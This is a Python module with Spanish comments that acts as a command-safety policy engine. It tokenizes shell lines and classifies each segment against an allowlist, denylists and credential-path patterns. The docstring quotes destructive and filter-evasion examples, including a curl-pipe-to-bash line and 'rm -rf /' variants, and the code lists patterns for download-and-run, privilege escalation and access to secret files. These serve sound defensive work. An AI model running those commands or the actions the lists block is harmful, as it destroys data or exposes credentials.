"""
system/policy_commands.py
=========================
Evaluación determinística de líneas de shell para el motor de política de V-CORE.

Por qué existe
--------------
Evaluar la seguridad de un comando con `"rm -rf" in comando` no funciona:

  - `curl https://x.sh | bash` no contiene ninguna palabra "peligrosa";
  - `git status && rm -rf /` pasa cualquier chequeo que mire solo el inicio;
  - `python -c "import shutil; shutil.rmtree('/')"` es un `python` legítimo;
  - `r''m -rf /` y `rm$IFS-rf` evaden comparaciones literales.

La única forma defendible es **tokenizar** la línea, separarla por operadores y
evaluar **cada segmento**, clasificando el binario base contra una allowlist. Lo
que no se puede analizar no se auto-aprueba jamás: se pregunta.

Contrato
--------
`assess_command(command, ...)` devuelve un `CommandAssessment` con:

  - `effect`: "permit" | "deny" | "ask"
  - `risk`:   "low" | "medium" | "high" | "critical"
  - `rule_id`: la regla exacta que decidió (para auditar y explicar)
  - `reason`: explicación legible para el usuario
  - `tokens`, `segments`, `matched`: qué se analizó y qué disparó la regla
  - `analyzable`: False si la línea usa construcciones que no se pueden validar

Este módulo no ejecuta nada: es un PDP puro, sin efectos secundarios.
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import dataclass, field
from pathlib import Path


# ---------------------------------------------------------------------------
# Estructuras
# ---------------------------------------------------------------------------

@dataclass
class CommandAssessment:
    effect: str                  # permit | deny | ask
    risk: str                    # low | medium | high | critical
    rule_id: str
    reason: str
    command: str = ""
    tokens: list[str] = field(default_factory=list)
    segments: list[list[str]] = field(default_factory=list)
    matched: list[str] = field(default_factory=list)
    analyzable: bool = True
    paths_checked: list[str] = field(default_factory=list)

    @property
    def is_permit(self) -> bool:
        return self.effect == "permit"

    def as_dict(self) -> dict:
        return {
            "effect": self.effect,
            "risk": self.risk,
            "rule_id": self.rule_id,
            "reason": self.reason,
            "matched": self.matched,
            "analyzable": self.analyzable,
            "paths_checked": self.paths_checked,
        }


# ---------------------------------------------------------------------------
# Catálogos por defecto
# ---------------------------------------------------------------------------

# Comandos que solo leen. Se permiten sin preguntar dentro del perímetro.
DEFAULT_ALLOWLIST: dict[str, list[str] | str] = {
    # Inspección de archivos
    "ls": "*", "dir": "*", "cat": "*", "type": "*", "head": "*", "tail": "*",
    "wc": "*", "file": "*", "stat": "*", "tree": "*",
    # Búsqueda
    "grep": "*", "rg": "*", "find": "*", "fd": "*", "select-string": "*",
    "where": "*", "which": "*", "get-command": "*",
    # Git: solo lectura de estado e historial
    "git": ["status", "diff", "log", "show", "branch", "remote", "rev-parse",
            "describe", "blame", "stash list", "config --get", "ls-files"],
    # Intérpretes: SOLO en formas verificables (ver _check_interpreter)
    "python": ["-m pytest", "-m py_compile", "--version", "-V"],
    "python3": ["-m pytest", "-m py_compile", "--version", "-V"],
    "py": ["-m pytest", "-m py_compile", "--version", "-V"],
    "node": ["--version", "-v", "--check"],
    "npm": ["--version", "test", "run build", "run lint", "run test"],
    "npx": ["--version"],
    "pytest": "*",
    # Utilidades inocuas
    "echo": "*", "pwd": "*", "date": "*", "whoami": "*", "hostname": "*",
    "true": "*", "sort": "*", "uniq": "*", "cut": "*", "tr": "*",
}

# Comandos que JAMÁS se ejecutan, aunque alguien los agregue a la allowlist de
# arriba por error. La denylist existe como capa de defensa en profundidad, no
# como mecanismo principal.
DEFAULT_DENYLIST = [
    # Destructivos
    r"\brm\b", r"\brmdir\b", r"\bdel\b", r"\berase\b", r"\bformat\b",
    r"\bmkfs\b", r"\bdd\b", r"\bshred\b", r"\btruncate\b",
    r"\bshutdown\b", r"\breboot\b", r"\bhalt\b", r"\bpoweroff\b",
    r"\bRemove-Item\b", r"\bClear-Disk\b", r"\bFormat-Volume\b",
    # Permisos y propiedad
    r"\bchmod\b", r"\bchown\b", r"\bicacls\b", r"\btakeown\b",
    # Escalada / sistema
    r"\bsudo\b", r"\brunas\b", r"\bsu\b", r"\breg\s+add\b",
    r"\bschtasks\b", r"\bcrontab\b", r"\bsc\s+config\b",
    # Persistencia / descarga ciega
    r"\bcurl\b.*\|\s*(ba)?sh", r"\bwget\b.*\|\s*(ba)?sh",
    r"\bcurl\b.*-o\b.*\b(\.exe|\.msi|\.bat|\.ps1)\b",
    r"Invoke-Expression", r"\biex\b", r"\birm\b",
    # Descarga de ejecutables por intérprete
    r"\beval\b", r"\bexec\b",
]

# Intérpretes: si aparecen como destino de un pipe, es ejecución de contenido
# remoto o generado. Deny directo.
PIPE_SHELL_TARGETS = {"bash", "sh", "zsh", "ksh", "fish", "dash", "python",
                      "python3", "node", "perl", "ruby", "php", "pwsh",
                      "powershell", "cmd", "iex"}

# Intérpretes que aceptan código en línea (`-c`, `-e`): la invocación es
# legítima, el contenido no es verificable sin ejecutarlo.
INTERPRETERS = {"python", "python3", "py", "node", "pwsh", "powershell",
                "perl", "ruby", "php"}

# Rutas/patrones que indican acceso a credenciales.
SECRET_PATTERNS = [
    r"\.env($|\b)", r"\.env\.", r"id_rsa", r"id_ed25519", r"\.pem$",
    r"credentials", r"\.aws[/\\]", r"\.ssh[/\\]", r"secrets?\.(json|ya?ml|toml)",
    r"api[_-]?key", r"\.npmrc", r"\.netrc", r"\.git-credentials",
    r"keyring", r"\.pfx$", r"\.p12$",
]

# Ramas que no se tocan con push.
PROTECTED_BRANCHES = {"main", "master", "release", "production", "prod"}

# Operadores de control que separan segmentos independientes.
SEGMENT_OPERATORS = [";", "&&", "||", "|", "&"]

# Construcciones que impiden validar la línea por completo.
# No se rechazan de plano: se marcan como no analizables y se pregunta.
UNANALYZABLE_PATTERNS = [
    (r"\$\(", "sustitución de comandos $(...)"),
    (r"`[^`]+`", "sustitución de comandos con backticks"),
    (r"(^|[^\w])\([^)]*\)", "subshell ( ... )"),
    (r"\$\{", "expansión de parámetros ${...}"),
    (r"\bsource\b|\b\.\s+/", "source de un script"),
]


# ---------------------------------------------------------------------------
# Tokenización
# ---------------------------------------------------------------------------

def tokenize(command: str) -> tuple[list[str], bool]:
    """Tokeniza la línea preservando operadores como tokens propios.

    Posix `shlex` no separa `;`/`&&`/`|`, así que se normaliza primero: se
    espacian los operadores fuera de comillas. Devuelve (tokens, ok); `ok=False`
    si las comillas están desbalanceadas (línea sospechosa → ask).
    """
    spaced = _space_out_operators(command)
    try:
        tokens = shlex.split(spaced, posix=True)
        return tokens, True
    except ValueError:
        # Comillas sin cerrar: no se puede analizar con confianza.
        return spaced.split(), False


def _space_out_operators(command: str) -> str:
    """Rodea los operadores de shell con espacios, respetando comillas."""
    out: list[str] = []
    quote: str | None = None
    i = 0
    while i < len(command):
        ch = command[i]
        if quote:
            out.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            out.append(ch)
            i += 1
            continue
        two = command[i:i + 2]
        if two in ("&&", "||", ">>", "2>"):
            out.append(f" {two} ")
            i += 2
            continue
        if ch in (";", "|", "&", ">", "<"):
            out.append(f" {ch} ")
            i += 1
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def split_segments(tokens: list[str]) -> list[list[str]]:
    """Separa la lista de tokens en segmentos independientes por operadores."""
    segments: list[list[str]] = [[]]
    for tok in tokens:
        if tok in SEGMENT_OPERATORS:
            if segments[-1]:
                segments.append([])
        elif tok in (">", ">>", "<", "2>"):
            # La redirección pertenece al segmento actual; el destino se evalúa aparte.
            segments[-1].append(tok)
        else:
            segments[-1].append(tok)
    return [s for s in segments if s]


# ---------------------------------------------------------------------------
# Helpers de análisis
# ---------------------------------------------------------------------------

def _looks_like_path(tok: str) -> bool:
    if not tok or tok.startswith("-"):
        return False
    if any(sep in tok for sep in ("/", "\\", "..", "~")):
        return True
    return bool(re.match(r"^[A-Za-z]:$", tok[:2])) or tok.startswith(".")


def _check_secrets(tokens: list[str]) -> str | None:
    joined = " ".join(tokens)
    for pat in SECRET_PATTERNS:
        if re.search(pat, joined, re.IGNORECASE):
            return pat
    return None


def _check_denylist(tokens: list[str]) -> str | None:
    joined = " ".join(tokens)
    for pat in DEFAULT_DENYLIST:
        if re.search(pat, joined, re.IGNORECASE):
            return pat
    return None


def _has_pipe_to_shell(segments: list[list[str]], tokens: list[str]) -> str | None:
    """Detecta `... | bash`, `... | python`, etc."""
    for i, tok in enumerate(tokens):
        if tok == "|" and i + 1 < len(tokens):
            nxt = os.path.basename(tokens[i + 1]).lower()
            if nxt in PIPE_SHELL_TARGETS:
                return tokens[i + 1]
    return None


def _check_interpreter(base: str, rest: list[str]) -> bool:
    """¿Es una invocación de intérprete verificable (no código arbitrario)?

    `python -m pytest` es verificable. `python -c "..."` no: el contenido del
    string puede hacer cualquier cosa y no se puede validar sin ejecutarlo.
    """
    if not rest:
        return base in ("pytest",)
    first = rest[0]
    if first in ("-c", "-e", "--eval", "-Command", "-EncodedCommand"):
        return False
    if first in ("-", "<<"):
        return False
    return True


def _match_allowlist(base: str, rest: list[str],
                     allowlist: dict[str, list[str] | str]) -> tuple[bool, str]:
    """Compara el binario base y su subcomando contra la allowlist."""
    if base not in allowlist:
        return False, f"'{base}' no está en la allowlist"
    spec = allowlist[base]
    if spec == "*":
        return True, f"'{base}' es de solo lectura"
    if not rest:
        return False, f"'{base}' requiere un subcomando permitido"
    joined = " ".join(rest)
    for allowed in spec:  # type: ignore[union-attr]
        if joined.startswith(allowed) or allowed in joined.split():
            return True, f"'{base} {allowed}' está permitido"
    return False, f"'{base} {rest[0]}' no está en la allowlist"


def _check_git_push(base: str, rest: list[str]) -> str | None:
    """Detecta push a ramas protegidas (incluido forzado)."""
    if base != "git":
        return None
    joined = " ".join(rest).lower()
    if "push" not in joined:
        return None
    force = "--force" in joined or "-f" in rest or "--force-with-lease" in joined
    branch = ""
    for tok in rest:
        if tok in PROTECTED_BRANCHES:
            branch = tok
    if branch and (force or True):
        return f"push a rama protegida '{branch}'" + (" (forzado)" if force else "")
    if force:
        return "git push --force"
    return None


def _resolve_targets(tokens: list[str], workspace: Path | None) -> list[Path]:
    """Resuelve los tokens que parecen rutas, para validarlos contra el perímetro."""
    out: list[Path] = []
    for tok in tokens:
        if not _looks_like_path(tok):
            continue
        try:
            p = Path(os.path.expandvars(os.path.expanduser(tok)))
            if not p.is_absolute() and workspace is not None:
                p = workspace / p
            out.append(p.resolve())
        except Exception:
            continue
    return out


# ---------------------------------------------------------------------------
# API pública
# ---------------------------------------------------------------------------

def assess_command(
    command: str,
    workspace: Path | None = None,
    allowed_roots: list[Path] | None = None,
    allowlist: dict[str, list[str] | str] | None = None,
    sandbox: bool = False,
) -> CommandAssessment:
    """Evalúa una línea de shell y devuelve la decisión de política.

    Orden de evaluación (la primera coincidencia gana): deny > ask > permit.
    `sandbox=True` relaja únicamente las reglas de perímetro (la acción ocurre
    dentro de un workspace desechable), nunca las de destructividad, secretos o
    red.
    """
    allow = allowlist or DEFAULT_ALLOWLIST
    command = (command or "").strip()
    if not command:
        return CommandAssessment("ask", "medium", "command.empty",
                                 "Comando vacío: no se puede evaluar", command)

    tokens, well_formed = tokenize(command)
    segments = split_segments(tokens)

    # ── 1. Estructura analizable? ────────────────────────────────────
    if not well_formed:
        return CommandAssessment(
            "ask", "high", "command.unparsable",
            "Las comillas de la línea están desbalanceadas: no se puede analizar "
            "la estructura real del comando.",
            command, tokens, segments, ["comillas desbalanceadas"], False)

    for pattern, label in UNANALYZABLE_PATTERNS:
        if re.search(pattern, command):
            return CommandAssessment(
                "ask", "high", "command.not_analyzable",
                f"El comando usa {label}, que impide validar qué se va a ejecutar.",
                command, tokens, segments, [label], False)

    # ── 2. Deny: pipe hacia intérprete ───────────────────────────────
    piped = _has_pipe_to_shell(segments, tokens)
    if piped:
        return CommandAssessment(
            "deny", "critical", "command.pipe_to_shell",
            f"El comando envía datos por pipe hacia '{piped}': eso es ejecución de "
            "contenido arbitrario, la vía clásica de compromiso.",
            command, tokens, segments, ["|", piped], False)

    # ── 3. Deny: secretos ────────────────────────────────────────────
    secret = _check_secrets(tokens)
    if secret:
        return CommandAssessment(
            "deny", "critical", "command.secrets_access",
            "El comando accede a credenciales o claves. Está prohibido sin "
            "excepción: es la vía de exfiltración.",
            command, tokens, segments, [secret], False)

    # ── 4. Deny: denylist de destructivos ────────────────────────────
    danger = _check_denylist(tokens)
    if danger:
        return CommandAssessment(
            "deny", "critical", "command.destructive",
            "El comando coincide con un patrón destructivo o de escalada de "
            "privilegios y no se ejecuta bajo ninguna circunstancia.",
            command, tokens, segments, [danger], False)

    # ── 5. Deny: push a rama protegida ───────────────────────────────
    for seg in segments:
        if not seg:
            continue
        base = os.path.basename(seg[0]).lower()
        push = _check_git_push(base, seg[1:])
        if push:
            return CommandAssessment(
                "deny", "high", "command.git_protected_push",
                f"Operación de git sobre rama protegida: {push}. Afecta trabajo "
                "remoto compartido.",
                command, tokens, segments, [push], False)

    # ── 6. Perímetro: rutas fuera del workspace ──────────────────────
    #
    # Dos fronteras distintas, con efectos distintos:
    #   - fuera de `allowed_roots`  -> deny  (el perímetro duro)
    #   - fuera del workspace pero dentro de los roots -> ask
    # En modo sandbox la acción ocurre en un worktree desechable, pero eso NO
    # habilita tocar el resto del repo: el permiso sigue siendo el mismo. El
    # sandbox relaja la *ejecución*, no el alcance de escritura.
    targets = _resolve_targets(tokens, workspace)
    paths_checked = [str(p) for p in targets]
    if workspace is not None:
        roots = allowed_roots if allowed_roots is not None else [workspace]
        for p in targets:
            if not any(_under(p, r) for r in roots):
                return CommandAssessment(
                    "deny", "high", "path.outside_perimeter",
                    f"El comando toca '{p}', que está fuera de las raíces "
                    "permitidas.",
                    command, tokens, segments, [str(p)], False, paths_checked)
            if not _under(p, workspace):
                return CommandAssessment(
                    "ask", "medium", "path.outside_workspace",
                    f"El comando toca '{p}', fuera del workspace de la sesión "
                    "pero dentro de las raíces permitidas.",
                    command, tokens, segments, [str(p)], True, paths_checked)

    # ── 7. Allowlist por segmento ────────────────────────────────────
    for seg in segments:
        if not seg:
            continue
        base = os.path.basename(seg[0]).lower()
        rest = [t for t in seg[1:] if t not in ("|", ";", "&&", "||", "&", ">", ">>", "<")]

        # El chequeo de intérprete va ANTES que el de allowlist: `python -c "..."`
        # es más grave (código no verificable) que "comando no listado", y la
        # regla reportada debe ser la que explica el riesgo real.
        if base in INTERPRETERS and not _check_interpreter(base, rest):
            return CommandAssessment(
                "ask", "high", "command.interpreter_inline_code",
                f"'{base}' recibe código en línea, que no se puede validar sin "
                "ejecutarlo.",
                command, tokens, segments, [base], False, paths_checked)

        ok, why = _match_allowlist(base, rest, allow)
        if not ok:
            return CommandAssessment(
                "ask", "medium", "command.not_allowlisted",
                f"El comando no está en la allowlist: {why}. Requiere aprobación.",
                command, tokens, segments, [base], True, paths_checked)

    # ── 8. Permit ────────────────────────────────────────────────────
    return CommandAssessment(
        "permit", "low", "command.allowlisted_readonly",
        "Todos los segmentos del comando están en la allowlist de solo lectura.",
        command, tokens, segments, [], True, paths_checked)


def _under(child: Path, parent: Path) -> bool:
    """Comparación jerárquica robusta en Windows (case-insensitive)."""
    try:
        c = os.path.normcase(str(child))
        p = os.path.normcase(str(parent))
        return c == p or c.startswith(p.rstrip("\\/") + os.sep)
    except Exception:
        return False
